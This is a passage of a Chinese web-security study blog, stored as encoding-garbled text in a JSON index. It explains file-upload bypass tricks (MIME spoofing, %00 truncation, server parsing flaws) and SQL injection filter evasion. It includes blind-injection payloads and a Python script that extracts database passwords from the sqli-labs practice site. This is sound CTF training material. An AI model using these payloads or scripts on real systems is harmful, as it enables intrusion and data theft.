¼å¼çš„æ–‡ä»¶éƒ½èƒ½ä¸Šä¼  echo '&lt;pre&gt;'; echo 'Your image was not uploaded.'; echo '&lt;/pre&gt;'; &#125; else &#123; echo '&lt;pre&gt;'; echo $target_path . ' succesfully uploaded!'; echo '&lt;/pre&gt;'; &#125; &#125;?&gt; æ–‡ä»¶ä¸Šä¼ æ¼æ´æ£€æµ‹ å®¢æˆ·ç«¯javascriptæ£€æµ‹ï¼šé€šå¸¸åœ¨æœ¬åœ°æ£€æµ‹æ–‡ä»¶çš„æ‰©å±•å æœåŠ¡ç«¯MIMEç±»å‹æ£€æµ‹ï¼šé€šå¸¸æ£€æµ‹çš„æ˜¯Content-Typeå†…å®¹ æœåŠ¡ç«¯ç›®å½•è·¯å¾„æ£€æµ‹ï¼šé€šå¸¸æ ¹pathå‚æ•°ç›¸å…³çš„å†…å®¹ æœåŠ¡ç«¯æ–‡ä»¶æ‰©å±•åæ£€æµ‹ï¼šé€šå¸¸æ£€æµ‹è·Ÿæ–‡ä»¶extensionç›¸å…³çš„å†…å®¹ æœåŠ¡ç«¯æ–‡ä»¶å†…å®¹æ£€æµ‹ï¼šæ£€æµ‹æ–‡ä»¶å†…å®¹æ˜¯å¦åˆæ³•æˆ–å«æœ‰æ¶æ„ä»£ç  å®¢æˆ·ç«¯javascriptæ£€æµ‹åœ¨å®¢æˆ·ç«¯ä½¿ç”¨jså¯¹ä¸åˆæ³•å›¾ç‰‡è¿›è¡Œæ£€æŸ¥ ç»•è¿‡ï¼š ç¦ç”¨é¡µé¢js å…ˆæŠŠæ–‡ä»¶æ”¹æˆç¬¦åˆæ¡ä»¶çš„æ–‡ä»¶æ ¼å¼ä¸Šä¼ ï¼Œåœ¨æŠ“åŒ…ï¼Œä¿®æ”¹æ–‡ä»¶çš„åç¼€å æœåŠ¡ç«¯æ£€æµ‹ç»•è¿‡ï¼ˆMIMEç±»å‹æ£€æµ‹ï¼‰é€šè¿‡åˆ¤æ–­$_FILES[&#39;userfile&#39;][&#39;type&#39;]!=&quot;imgae/gif&quot;æ¥ä¿è¯ä¸Šä¼ çš„æ–‡ä»¶ç±»å‹ä¸ºgif ç»•è¿‡ï¼šé€šè¿‡burpæŠ“åŒ…ï¼Œå°†åŸæ¥çš„Content-Typeç±»å‹æ”¹ä¸ºç¬¦åˆè¦æ±‚çš„ç±»å‹ 1Content-Type: application/octet-stream application/octet-streamå³ä¸ºphpæ–‡ä»¶çš„æ–‡ä»¶ç±»å‹æ ¼å¼ æœåŠ¡ç«¯ç›®å½•è·¯å¾„æ£€æµ‹ä¸Šä¼ è·¯å¾„ä¸º/image/20160704æ—¶ï¼Œå¯ä»¥é€šè¿‡ä¿®æ”¹ä¸ºimage/20160704/eval.php%00filename.gif é€šè¿‡%00æˆªæ–­æœ€ç»ˆå¯¼è‡´å­˜å‚¨çš„æ–‡ä»¶åä¸ºeval.php æœåŠ¡ç«¯æ–‡ä»¶æ‰©å±•åæ£€æµ‹åˆ†ä¸ºé»‘åå•æ£€æµ‹å’Œç™½åå•æ£€æµ‹ é»‘åå•æ£€æµ‹æ¥æ”¶ä¸Šä¼ çš„æ–‡ä»¶åšå¯¹æ¯”ï¼Œå¦‚æœåŒ¹é…åˆ°é»‘åå•ä¸­çš„åç¼€åï¼Œåˆ™ä¸å…è®¸ä¸Šä¼  ç»•è¿‡ï¼š åç¼€åå¤§å°å†™ç»•è¿‡ï¼Œä¾‹å¦‚ï¼šå°†Burpsuiteæˆªè·çš„æ•°æ®åŒ…ä¸­çš„æ–‡ä»¶åevil.phpæ”¹evil.php åå•åˆ—è¡¨ç»•è¿‡ï¼Œå°è¯•ä½¿ç”¨éé»‘åå•å†…çš„åç¼€åï¼Œå¦‚php5ï¼Œphp7ç­‰ ç‰¹æ®Šæ–‡ä»¶åç»•è¿‡ï¼ˆåªé€‚ç”¨windowsï¼Œå°†æ–‡ä»¶åæ”¹ä¸ºevil.php.æˆ–evil.phpï¼ˆæ³¨æ„è¿™é‡Œæœ‰ä¸€ä¸ªç©ºæ ¼)ã€‚åœ¨windowsä¸‹ï¼Œä¸å…è®¸è¿™æ ·çš„å‘½åï¼Œæ‰€ä»¥ä¼šå°†.å’Œç©ºæ ¼è‡ªåŠ¨å»æ‰ï¼‰ã€‚ 0x00æˆªæ–­ç»•è¿‡ï¼šåœ¨ä¸Šä¼ çš„æ—¶å€™ï¼Œå½“æ–‡ä»¶ç³»ç»Ÿè¯»åˆ°0x00æ—¶ï¼Œä¼šè®¤ä¸ºæ–‡ä»¶å·²ç»ç»“æŸã€‚ä¾‹å¦‚ï¼š1.php%00.jpgï¼ŒéªŒè¯æ‰©å±•åæ˜¯.jpgï¼Œä½†å†™å…¥çš„æ—¶å€™æ˜¯1.phpæ–‡ä»¶ ç™½åå•æ£€æµ‹æ¥æ”¶ä¸Šä¼ çš„æ–‡ä»¶åšæ‰©å±•ååŒ¹é…ï¼ŒåŒ¹é…ä¸Šçš„ç™½åå•ä¸­çš„æ‰©å±•åçš„æ–‡ä»¶æ‰èƒ½ä¸Šä¼  ç»•è¿‡ï¼š 0x00é˜¶æ®µç»•è¿‡ è§£ææ¼æ´ç»•è¿‡ ï¼ˆ1ï¼‰apacheè§£ææ–‡ä»¶åæ˜¯ä»å³åˆ°å·¦è¯†åˆ«æ‰©å±•åï¼Œå¦‚eval.php.jpgï¼Œæ–‡ä»¶ä¸ºphpæ–‡ä»¶ï¼Œä¸èƒ½è§£æjpgä¼šå‘å‰è§£æphp ï¼ˆ2ï¼‰IIS6.0ç›®å½•ååŒ…å«.aspã€.asaã€.cerçš„è¯ï¼Œåˆ™è¯¥ç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶éƒ½å°†æŒ‰ç…§aspè§£æã€‚ ï¼ˆ3ï¼‰IIS6.0ä¸è§£æ;åé¢çš„ï¼Œæ‰€ä»¥æäº¤evil.asp;.htmlè§£æä¸ºaspç±»å‹ ï¼ˆ4ï¼‰Nginxè§£ææ¼æ´ï¼šå°†phpæ–‡ä»¶æ¢æˆå…¶ä»–å¯ä»¥é€šè¿‡çš„æ–‡ä»¶åç¼€ï¼Œè®¿é—®çš„æ—¶å€™åœ¨åé¢åŠ ä¸Ševal.php.jpgï¼Œå¦‚evil.jpg/.phpï¼Œevil.jpgä¼šè§£æä¸ºphpçš„æ ¼å¼ æœåŠ¡ç«¯æ–‡ä»¶å†…å®¹æ£€æµ‹ å›¾åƒç±»æ–‡ä»¶å†…å®¹æ£€æµ‹ æ–‡ä»¶å¹»æ•°æ£€æµ‹ï¼ˆå›¾ç‰‡å¤´æ ¼å¼æ£€æµ‹ï¼‰ jpgå†…å®¹å¤´value = FF D8 FF E0 00 10 4A 46 49 46 gifå†…å®¹å¤´value = 47 49 46 38 39 61 pngå†…å®¹å¤´value = 89 50 4E 47 ç»•è¿‡ï¼šåœ¨æ–‡ä»¶å¤´ååŠ ä¸Šä¸€å¥è¯æœ¨é©¬å°±èƒ½ç»•è¿‡ Upload-Labsåˆ†åˆ«å¯¹å®¢æˆ·ç«¯javascriptæ£€æµ‹ã€æœåŠ¡ç«¯MIMEç±»å‹æ£€æµ‹ã€æœåŠ¡ç«¯ç›®å½•è·¯å¾„æ£€æµ‹ä¸‰ç§ä¸åŒç±»å‹çš„ç»•è¿‡è¿›è¡Œç»ƒä¹ ã€‚ è¿™é‡Œæœ‰ä¸ªå‘ã€‚ç»è¿‡æ½˜å¤§ä½¬çš„æµ‹è¯•ï¼Œä¸Šä¼ æ–‡ä»¶è¶…è¿‡äº†æ–‡ä»¶å¤§å°php.iniä¸­å³ç³»ç»Ÿè®¾å®šçš„å¤§å°ã€‚php.iniä¸­çš„é…ç½®åŸæœ¬ä¸ºupload_max_filesize = 2Mï¼Œä¿®æ”¹ä¸ºupload_max_filesize = 20Mã€‚ç„¶åå°±å¯ä»¥ä¸Šä¼ æ–‡ä»¶äº†ã€‚ pass-01æºç ï¼š 1234567891011121314151617function checkFile() &#123; var file = document.getElementsByName('upload_file')[0].value; if (file == null || file == \"\") &#123; alert(\"è¯·é€‰æ‹©è¦ä¸Šä¼ çš„æ–‡ä»¶!\"); return false; &#125; //å®šä¹‰å…è®¸ä¸Šä¼ çš„æ–‡ä»¶ç±»å‹ var allow_ext = \".jpg|.png|.gif\"; //æå–ä¸Šä¼ æ–‡ä»¶çš„ç±»å‹ var ext_name = file.substring(file.lastIndexOf(\".\")); //åˆ¤æ–­ä¸Šä¼ æ–‡ä»¶ç±»å‹æ˜¯å¦å…è®¸ä¸Šä¼  if (allow_ext.indexOf(ext_name + \"|\") == -1) &#123; var errMsg = \"è¯¥æ–‡ä»¶ä¸å…è®¸ä¸Šä¼ ï¼Œè¯·ä¸Šä¼ \" + allow_ext + \"ç±»å‹çš„æ–‡ä»¶,å½“å‰æ–‡ä»¶ç±»å‹ä¸ºï¼š\" + ext_name; alert(errMsg); return false; &#125;&#125; å¯ä»¥çŸ¥é“æ­¤å¤„çš„è¿‡æ»¤æ˜¯é€šè¿‡javascriptå®ç°çš„ï¼Œåœ¨å¼€å‘è€…å·¥å…·ä¸­ç¦ç”¨jså°±å¯ä»¥ä¸Šä¼ æœ¨é©¬ pass-02æºç ï¼š 12345678910111213141516$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists($UPLOAD_ADDR)) &#123; if (($_FILES['upload_file']['type'] == 'image/jpeg') || ($_FILES['upload_file']['type'] == 'image/png') || ($_FILES['upload_file']['type'] == 'image/gif')) &#123; if (move_uploaded_file($_FILES['upload_file']['tmp_name'], $UPLOAD_ADDR . '/' . $_FILES['upload_file']['name'])) &#123; $img_path = $UPLOAD_ADDR . $_FILES['upload_file']['name']; $is_upload = true; &#125; &#125; else &#123; $msg = 'æ–‡ä»¶ç±»å‹ä¸æ­£ç¡®ï¼Œè¯·é‡æ–°ä¸Šä¼ ï¼'; &#125; &#125; else &#123; $msg = $UPLOAD_ADDR.'æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼'; &#125;&#125; è¿™é‡Œå¯¹æ–‡ä»¶MIMEç±»å‹è¿›è¡Œäº†é™åˆ¶ï¼Œåªéœ€è¦ç”¨burpsuiteæŠ“åŒ…åï¼Œå°†Content-Typeä¿®æ”¹ä¸ºimage/jpegæˆ–image/gifæˆ–image/pngï¼Œæ”¾åŒ…åä¸Šä¼ æˆåŠŸ pass-11æºç ï¼š 1234567891011121314151617181920$is_upload = false;$msg = null;if(isset($_POST['submit']))&#123; $ext_arr = array('jpg','png','gif'); $file_ext = substr($_FILES['upload_file']['name'],strrpos($_FILES['upload_file']['name'],\".\")+1); if(in_array($file_ext,$ext_arr))&#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = $_GET['save_path'].\"/\".rand(10, 99).date(\"YmdHis\").\".\".$file_ext; if(move_uploaded_file($temp_file,$img_path))&#123; $is_upload = true; &#125; else&#123; $msg = 'ä¸Šä¼ å¤±è´¥ï¼'; &#125; &#125; else&#123; $msg = \"åªå…è®¸ä¸Šä¼ .jpg|.png|.gifç±»å‹æ–‡ä»¶ï¼\"; &#125;&#125; è¿™é‡Œç”±äºæœ‰jpgã€pngã€gifçš„ç™½åå•ï¼Œéœ€è¦æƒ³åŠæ³•ç»•è¿‡ã€‚ç„¶ååœ¨æ¥æ”¶åˆ°æ–‡ä»¶åè¿˜ä¼šå¯¹æ–‡ä»¶ä¿®æ”¹åå­—å¹¶æœ€åå­˜ä¸ºç›¸åº”æ ¼å¼çš„æ–‡ä»¶ã€‚æ•…è¿™é‡Œå…ˆå°†ä¸Šä¼ çš„æ–‡ä»¶ä¿®æ”¹ä¸ºç™½åå•ä¸­çš„æ ¼å¼ï¼Œå†æŠŠæ–‡ä»¶æœ€åå­˜å‚¨çš„ä½ç½®é€šè¿‡%00å¯¹åé¢çš„åç¼€åæˆªæ–­ å®éªŒå§ä¹‹ä¸Šä¼ ç»•è¿‡bypass the uploadæ ¼å¼ï¼šflag{}è§£é¢˜é“¾æ¥ 0x00æˆªæ–­ä¸Šä¼ 12345&lt;%path=\"upfiles/picture/\"file=\"20180321.jpg\"upfilename=path &amp; file 'æœ€åçš„ä¸Šä¼ åœ°å€%&gt; upfilenameå³ä¸ºæœ€ç»ˆåå­—ï¼Œæ„æ€ä¸ºå¦‚æœåœ°å€ä¸ºpicture/1.php+ï¼Œæ–‡ä»¶åä¸º1.jpgåˆ™æœ€ç»ˆä¸Šä¼ ä¸Šå»çš„æ–‡ä»¶è·¯å¾„ä¸ºpicture/1.php+1.jpgã€‚0x00æˆªæ–­çš„æ€è·¯å³ä¸ºå°†+ä¹‹åçš„å†…å®¹å¿½ç•¥æ‰ä½¿ä¸Šä¼ æ–‡ä»¶1.jpgæœ€ç»ˆä¸Šä¼ åˆ°1.phpä¸­ã€‚ å…ˆéšä¾¿ä¸Šä¼ ä¸€ä¸ªå›¾ç‰‡æ–‡ä»¶ï¼Œæç¤ºéœ€è¦ä¸Šä¼ phpæ–‡ä»¶ã€‚åŒæ ·ä¸Šä¼ phpæ–‡ä»¶ï¼Œæç¤ºéœ€è¦ä¸Šä¼ å…¶ä»–æ ¼å¼æ–‡ä»¶ã€‚ è¿™é‡Œå°±éœ€è¦ç”¨åˆ°0x00æˆªæ–­ã€‚æäº¤å›¾ç‰‡åä½¿ç”¨burpsuiteæŠ“åŒ…ï¼Œåœ¨/uploads/åé¢åŠ ä¸Š1.php+ã€‚ ç„¶ååœ¨hexé‡ŒæŠŠ+å¯¹åº”çš„åå…­è¿›åˆ¶æ”¹ä¸º00ã€‚ ä¿®æ”¹å®Œæˆåå¾—åˆ°flagã€‚ å‚è€ƒç½‘ç«™http://www.php.cn/php-weizijiaocheng-359309.htmlhttps://blog.csdn.net/zhanghw0917/article/details/46793847https://www.cnblogs.com/bmjoker/p/9141322.html","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://qianfei11.github.io/tags/ctf/"},{"name":"web","slug":"web","permalink":"https://qianfei11.github.io/tags/web/"}]},{"title":"WEBå…¥é—¨ï¼ˆäºŒï¼‰","slug":"WEBå…¥é—¨ï¼ˆäºŒï¼‰","date":"2018-07-04T05:50:22.000Z","updated":"2019-02-03T09:43:53.383Z","comments":true,"path":"2018/07/04/WEBå…¥é—¨ï¼ˆäºŒï¼‰/","link":"","permalink":"https://qianfei11.github.io/2018/07/04/WEBå…¥é—¨ï¼ˆäºŒï¼‰/","excerpt":"ä»Šå¤©å­¦å§å¤ä¹ äº†å‰å¤©çš„æ•°å­—å‹å’Œå­—ç¬¦å‹æ³¨å…¥ï¼Œè®²äº†SQLæ³¨å…¥ä¸­å¯èƒ½å‡ºç°çš„è¿‡æ»¤ä»¥åŠç»•è¿‡çš„æ–¹å¼ï¼Œä»¥åŠå¸ƒå°”å‹ç›²æ³¨å’Œæ—¶é—´å‹ç›²æ³¨ã€‚","text":"ä»Šå¤©å­¦å§å¤ä¹ äº†å‰å¤©çš„æ•°å­—å‹å’Œå­—ç¬¦å‹æ³¨å…¥ï¼Œè®²äº†SQLæ³¨å…¥ä¸­å¯èƒ½å‡ºç°çš„è¿‡æ»¤ä»¥åŠç»•è¿‡çš„æ–¹å¼ï¼Œä»¥åŠå¸ƒå°”å‹ç›²æ³¨å’Œæ—¶é—´å‹ç›²æ³¨ã€‚ å¸¦è¿‡æ»¤çš„SQLæ³¨å…¥SQLæ³¨å…¥çš„è¿‡ç¨‹ä¸­æœ‰äº›ç‰¹å®šçš„å­—ç¬¦æˆ–è€…å­—ç¬¦ä¸²ä¼šè¢«è¿‡æ»¤ï¼Œæ•°æ®åº“æ— æ³•äº†è§£æ­£ç¡®çš„æŸ¥è¯¢è¯­å¥ã€‚ å¦‚ä½•ç»•è¿‡è¿‡æ»¤è¿ç”¨ç¼–ç æŠ€æœ¯ç»•è¿‡ ASCIIç  97, 115, 116)```å³ç­‰ä»·äº```east```12342. URLç¼–ç ```0x61646D696E```å³ç­‰ä»·äº```admin é‡å¤ä¾‹å¦‚ï¼š 12seleselectctadmadminin å¤§å°å†™äº¤æ›¿ä¾‹å¦‚ï¼š 12SeLEctUnIOn ç©ºæ ¼çš„ç»•è¿‡ ç”¨ä¸¤ä¸ªç©ºæ ¼æˆ–è€…TABä»£æ›¿ %a0ä»£æ›¿ /**/ä»£æ›¿ ç”¨æ‹¬å·()ä»£æ›¿ ç”¨+ä»£æ›¿ ç”¨èŠ±æ‹¬å·{}ä»£æ›¿ ç”¨å•å¼•å·æˆ–åŒå¼•å·ä»£æ›¿ å…³é”®è¡¨åè¿‡æ»¤ç»•è¿‡information_schema(è¿™é‡Œç©ºæ ¼).(è¿™é‡Œç©ºæ ¼)tables è¿‡æ»¤ç­‰å·ç”¨likeå¯ä»¥æ›¿ä»£ è¿‡æ»¤å¼•å·123456789101112131415## è¿‡æ»¤å¤§äºå°äºå·å‡½æ•°greatest()å’Œleast()åˆ†åˆ«æ›¿ä»£(&gt;)å’Œ(&lt;)ä¾‹å¦‚ï¼š```sqlselect * from users where id=1 and ascii(substr(database(),1,1))&gt;64``` ç­‰ä»·äº```sqlselect * from users where id=1 and greatest(ascii(substr(database(),1,1)),64)=64 è¿‡æ»¤é€—å·from 1 for 1)```1234## SLEEPå‡½æ•°ä¸­ä¸èƒ½ç”¨æ•°å­—ç”¨pi()å’Œceil()è¿‡æ»¤ sleep(ceil(pi()))1234## è¿‡æ»¤æ³¨é‡Šç¬¦ï¼ˆ#ã€--+ï¼‰ç”¨é—­åˆçš„æ–¹å¼ï¼š 1â€™ and â€˜112345678910## å®½å­—èŠ‚æ³¨å…¥åœ¨MYSQLä¸­æ˜¯ç”¨GBKç¼–ç æ—¶ï¼Œä¼šè®¤ä¸ºä¸¤ä¸ªå­—ç¬¦ä¸ºä¸€ä¸ªæ±‰å­—ã€‚å®½å­—èŠ‚æ³¨å…¥å³é€šè¿‡å¢åŠ ä¸€ä¸ªå­—ç¬¦æ¥è¿‡æ»¤æ‰è½¬ä¹‰å­—ç¬¦å‰çš„åæ–œæ æ¯”å¦‚â€œ\\&apos;â€çš„urlencodeç¼–ç ä¸º%5c%27ï¼Œåœ¨å‰é¢åŠ ä¸Š%dfï¼Œä¼šä½¿å¾—%df%5cæ„æˆä¸€ä¸ªæ±‰å­—ï¼Œ%27åˆ™ä½œä¸ºä¸€ä¸ªå•ç‹¬çš„å•å¼•å·## order byè¢«è¿‡æ»¤ä½¿ç”¨intoå˜é‡æ¥ç»•è¿‡ï¼š select * from users limit 1,1 into @a,@b,@c1234567891011121314151617åœ¨æœ¬åœ°ä¸€å¼ æœ‰å…­ä¸ªå­—æ®µçš„è¡¨ä¸­æµ‹è¯•ï¼š![å½“å­—æ®µæ•°ä¸åŒ¹é…æ—¶ä¼šæŠ¥é”™](/pics/WEBé›†è®­/äºŒ/1.png)![åŒ¹é…æ—¶ä¸ä¼šæŠ¥é”™](/pics/WEBé›†è®­/äºŒ/2.png)## åˆ©ç”¨ç­‰ä»·å‡½æ•°&gt; * hex()ã€bin() ==&gt; ascii()&gt; * sleep() ==&gt; benchmark()&gt; * concat_ws() ==&gt; group_concat()&gt; * mid()ã€substr()==&gt; substring()&gt; * @@user ==&gt; user()&gt; * @@datadir ==&gt; datadir()## MYSQLæ¡ä»¶æ³¨é‡Šåˆ©ç”¨ /!../12ä»¥ä¸Šè¯­å¥åœ¨å…¶ä»–æ•°æ®åº“ä¸­ä¸æ‰§è¡Œï¼Œä½†åœ¨MYSQLä¸­æ‰§è¡Œ /!50000â€¦/123456ä»¥ä¸Šè¯­å¥åœ¨50000ç‰ˆæœ¬ä»¥ä¸Šä¸æ‰§è¡Œï¼Œå¦åˆ™å¿…æ‰§è¡Œï¼Œç”¨äºè¿‡æ»¤æ­£åˆ™è¡¨è¾¾å¼# ç›²æ³¨é“ç›†å¯¹SQLå›æ˜¾æ³¨å…¥çš„è§£é‡Šï¼š æˆ‘é—®ä½ å«ä»€ä¹ˆåå­—ï¼Œä½ å›ç­”ä½ å«å¥¥ç‰¹æ›¼ã€‚123456789101112131415è€ŒSQLç›²æ³¨æ˜¯ç›¸åçš„ï¼Œå³ä¸ç›´æ¥æ˜¾ç¤ºæœç´¢åˆ°çš„ç»“æœï¼Œè€Œä»å…¶ä»–æ–¹å¼æ¥æ¨æ–­å¾—å‡ºç»“æœçš„SQLæ³¨å…¥SQLç›²æ³¨å¸¸ç”¨å‡½æ•°ï¼š&gt; * ifå’Œcase whenï¼šç”¨äºæ—¶é—´ç›²æ³¨&gt; * substringã€substrã€midç­‰ï¼šç”¨äºæˆªæ–­å­—ç¬¦ä¸²&gt; * asciiï¼šä½¿å­—ç¬¦å˜æˆASCIIç &gt; * limit offsetï¼šç”¨äºçŒœå–å†…å®¹## å¸ƒå°”ç›²æ³¨å³åªæœ‰TRUEå’ŒFALSEä¸¤ç§çŠ¶æ€ï¼Œè¿‡ç¨‹ä¸­éœ€è¦çŒœæµ‹ï¼Œç›´åˆ°æ­£ç¡®ä¸ºæ­¢é“ç›†ç®´è¨€ï¼š æˆ‘é—®ä½ å«ä»€ä¹ˆåå­—ï¼Œä½ åªä¼šè¯´æ˜¯å’Œä¸æ˜¯(ture false)ã€‚äºæ˜¯å°±ï¼Œæˆ‘é—®ä½ å«ä¸å«æç‹—è›‹å‘€ï¼Œä¸æ˜¯ã€‚å«ä¸å«ç‹å¤§èŠ±å‘€ï¼Œä¸æ˜¯ã€‚ä¸€ç›´çŒœåˆ°æ˜¯ä¸ºæ­¢ã€‚ä½†æ˜¯çŒœä¹Ÿè®²ç©¶æŠ€å·§ï¼Œä¸€ä¸ªå­—ä¸€ä¸ªå­—çš„çŒœçš„æ•ˆç‡æ¯”ä¸€èµ·çŒœä¸‰ä¸ªå­—æ•ˆç‡ä¸çŸ¥é“é«˜å‡ å€ã€‚1234561. åˆ¤æ–­æ˜¯å¦æœ‰ç›²æ³¨ç‚¹```mysql1&apos; and 1=1 # è¿”å›TRUE1&apos; and 1=2 # è¿”å›FALSEï¼Œå¹¶ä¸”æ²¡æœ‰è¿”å› å³SQLè¯­å¥æ‰§è¡ŒæˆåŠŸå’Œå¤±è´¥çš„è¿”å›ç•Œé¢å­˜åœ¨æŸç§å›ºå®šçš„å·®å¼‚ çŒœè§£åº“åã€è¡¨åã€åˆ—åã€å†…å®¹ 12341&apos; and substr(database(),1,1)=&apos;a&apos; # çŒœè§£åº“å1&apos; and substr((select group_concat(table_name) from information_schema.tables where table_schema=&apos;DatabaseName&apos;),1,1)=&apos;a&apos; # çŒœè§£è¡¨å1&apos; and substr((select group_concat(column_name) from information_schema.columns where table_name=&apos;TableName&apos;),1,1)=&apos;a&apos; # çŒœè§£åˆ—å1&apos; and substr((select group_concat(SomeThing) from DatabaseName.TableName),1,1)=&apos;a&apos; # çŒœè§£è¡¨å ä»¥ä¸Šå³ä¸ºåŸºæœ¬çš„çŒœè§£è¿‡ç¨‹ æ—¶é—´ç›²æ³¨å³å¯¹ä¸€ä¸ªå‘½ä»¤åªæœ‰ä¸€ä¸ªå›ºå®šçš„ååº”ï¼Œå¦‚æœæ˜¯æ­£ç¡®çš„å°±ä¼šç­‰å¾…ä¸€å®šçš„æ—¶é—´å†ååº”ï¼Œå¦‚æœé”™è¯¯ç«‹å³ååº” é“ç›†ç®´è¨€ï¼š 12æˆ‘é—®ä½ å«ä»€ä¹ˆåå­—ï¼Œæ— è®ºå¯¹é”™ï¼Œä½ åªä¼š å•Š çš„å«ä¸€å£°ã€‚äºæ˜¯å°±ï¼Œæ˜¯ = è®©ä½ ç«‹é©¬å•Šï¼Œä¸æ˜¯ = è®©ä½ è¿‡ä¸€ä¼šå†å•Šï¼Œä»¥æ­¤åŒºåˆ†ï¼Œå°±ä¾¿æˆå¸ƒå°”å‹ä¸€æ ·äº†ã€‚ åˆ¤æ–­æ˜¯å¦æœ‰ç›²æ³¨ç‚¹ 121&apos; and if(1=1,sleep(5),1) # å»¶è¿Ÿè¿”å›ä¸ºTRUE1&apos; and if(1=2,sleep(5),1) # ä¸å»¶è¿Ÿè¿”å›ä¸ºFALSE åŸºæœ¬ä¸å¸ƒå°”ç›²æ³¨ç±»ä¼¼ã€‚ çŒœè§£åº“åã€è¡¨åã€åˆ—åã€å†…å®¹ 12341&apos; and if((substr(database(),1,1)=&apos;a&apos;),sleep(5),1) # çŒœè§£åº“å1&apos; and if((substr((select group_concat(table_name) from information_schema.tables where table_schema=&apos;DatabaseName&apos;),1,1)=&apos;a&apos;),sleep(5),1) # çŒœè§£è¡¨å1&apos; and if((substr((select group_concat(column_name) from information_schema.columns where table_name=&apos;TableName&apos;),1,1)=&apos;a&apos;),sleep(5),1) # çŒœè§£åˆ—å1&apos; and if((substr((select group_concat(SomeThing) from DatabaseName.TableName),1,1)=&apos;a&apos;),sleep(5),1) # çŒœè§£è¡¨å ä»¥ä¸Šå³ä¸ºåŸºæœ¬çš„çŒœè§£è¿‡ç¨‹ã€‚ DVWAä¹‹SQL Injectionä¸Šè¯¾æ²¡æœ‰è®¤çœŸå¬ï¼ŒDVWAå®‰å…¨çº§åˆ«ä¸€ç›´å¼€åœ¨highï¼Œè¯•äº†å¥½ä¹…éƒ½åšä¸å‡ºã€‚ä¸‹é¢å°±è®°å½•ä¸€ä¸‹è§£é¢˜è¿‡ç¨‹ã€‚ åˆ¤æ–­æ³¨å…¥ç±»å‹ åˆ¤æ–­å­—æ®µæ•° çŒœè§£åº“åã€è¡¨åã€åˆ—å è·å–å¯†ç  é¢˜ç›®æºç 12345678910111213141516171819202122232425262728&lt;?php if(isset($_GET['Submit']))&#123; // Retrieve data $id = $_GET['id']; $getid = \"SELECT first_name, last_name FROM users WHERE user_id = '$id'\"; $result = mysql_query($getid) or die('&lt;pre&gt;' . mysql_error() . '&lt;/pre&gt;' ); $num = mysql_numrows($result); $i = 0; while ($i &lt; $num) &#123; $first = mysql_result($result,$i,\"first_name\"); $last = mysql_result($result,$i,\"last_name\"); echo '&lt;pre&gt;'; echo 'ID: ' . $id . '&lt;br&gt;First name: ' . $first . '&lt;br&gt;Surname: ' . $last; echo '&lt;/pre&gt;'; $i++; &#125;&#125;?&gt; SQL-LABS-MASTERè¿™é‡Œæœ‰ä¸ªå¾ˆå¤§çš„å‘ã€‚å› ä¸ºè‡ªå·±æ˜¯åœ¨è™šæ‹Ÿæœºä¸Šè·‘çš„PHPSTUDYï¼Œæƒ³ç”¨è„šæœ¬è·‘ç›²æ³¨çš„æ—¶å€™è§‰å¾—æœ‰ç‚¹éº»çƒ¦ï¼Œå°±ç›´æ¥ç”¨å¥³æœ‹å‹çš„ç”µè„‘äº†ã€‚ä½†æ˜¯åœ¨å¥³æœ‹å‹çš„ç”µè„‘ä¸Šå‘ç°å¼€ä¸äº†APACHEï¼Œåªèƒ½ç”¨NGINXï¼Œç„¶åå°±å‘ç°å„ç§è„šæœ¬è·‘ä¸å‡ºï¼Œæ‰‹æ³¨ä¹Ÿä¸è¡Œï¼Œä½†æ˜¯åœ¨åˆ«äººçš„ç”µè„‘ä¸Šæ˜æ˜èƒ½è·‘å•Šã€‚ è¿˜å¥½æœ‰ç‰›é€¼çš„å•¦å•¦å¤§å“¥å“¥å¸®å¿™æ‰å‘ç°äº†æ¼æ´ã€‚ åœ¨PHPçš„é…ç½®æ–‡ä»¶php-iniä¸­å‘ç°å‚æ•°agc_quotes_gpcæ˜¯onçš„ï¼Œå³ä¼šå¯¹æ³¨å…¥æ—¶çš„å•å¼•å·è¿›è¡Œè½¬ä¹‰ï¼ŒåŸæœ¬çš„æ³¨å…¥ç‚¹å°±å¾ˆéš¾è¢«æ³¨å…¥ã€‚ä¿®æ”¹æˆoffä¹‹åå³å¯ less-5æ ¹æ®æµ‹è¯•å¯ä»¥åˆ¤æ–­è¿™é‡Œä¸ºå¸ƒå°”ç›²æ³¨ è„šæœ¬å¦‚ä¸‹ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263import requestsurl = \"http://127.0.0.1/sqli-labs-master/less-5/index.php?id=\"payload = \"abcdefghijklmnopqrstuvwxyz1234567890!@#&#123;&#125;_-=+[]&amp;();\"def get_databse(): res = \"\" for i in range(1, 100): print(i) for ch in payload: sql = \"1' and substr(database(),&#123;&#125;,1)='&#123;&#125;'%23\".format(i, ch) r = requests.get(url + sql) if(len(r.text) == 704): res += ch print(res) break print(\"Database: \", res)def get_tables(): res = \"\" for i in range(1, 100): print(i) for ch in payload: sql = \"1' and substr((select group_concat(table_name separator ';') from information_schema.tables where table_schema='security'),&#123;&#125;,1)='&#123;&#125;'%23\".format(i, ch) r = requests.get(url + sql) if(len(r.text) == 704): res += ch print(res) break print(\"Table names: \", res)def get_columns(): res = \"\" for i in range(1, 100): print(i) for ch in payload: sql = \"1' and substr((select group_concat(column_name separator ';') from information_schema.columns where table_name='users' and table_schema=database()),&#123;&#125;,1)='&#123;&#125;'%23\".format(i, ch) r = requests.get(url + sql) if(len(r.text) == 704): res += ch print(res) break print(\"Column names: \", res)def get_flag(): res = \"\" for i in range(1, 100): print(i) for ch in payload: sql = \"1' and substr((select group_concat(password separator ';') from security.users),&#123;&#125;,1)='&#123;&#125;'%23\".format(i, ch) r = requests.get(url + sql) if(len(r.text) == 704): res += ch print(res) break print(\"Flag: \", res)if __name__ == '__main__': # get_databse() # åº“åï¼šsecurity # get_tables() # è¡¨åï¼šemails;referers;uagents;users # get_columns() # åˆ—åï¼š1.id;email_id 2.id;referer;ip_address 3.id;uagent;ip_address;username 4.id;username;password # æ ¹æ®ä»¥ä¸Šçš„ç»“æœå¯ä»¥è®¤ä¸ºéœ€è¦æ‰¾çš„ä¸œè¥¿åœ¨usersè¡¨ä¸­çš„passwordå­—æ®µ get_flag() # 